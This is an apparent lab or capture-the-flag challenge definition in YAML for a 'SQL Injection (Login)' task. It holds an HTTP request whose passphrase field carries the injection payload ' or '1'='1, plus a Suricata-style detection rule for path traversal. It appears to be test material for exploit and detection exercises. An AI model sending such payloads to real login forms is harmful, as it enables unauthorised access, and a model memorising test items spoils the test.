name: 'SQL Injection (Login)'
type: 'exploit'

text: |-
  **Goal: Log in**

hints: []

target:
  dev:
    host: localhost
    port: 10005
  prod:
    host: detector
    port: 80

base_request: |-
  POST / HTTP/1.1
  Host: localhost

  passphrase=thisisnotthepassword' or '1'='1

rules:
- 'alert http any any -> any any (msg:"%%ID%%"; flow:to_server,established; http.method; content:"GET"; http.uri.raw; content:".."; sid:1030005; rev:1;)'

expected_output: "TOP SECRET"
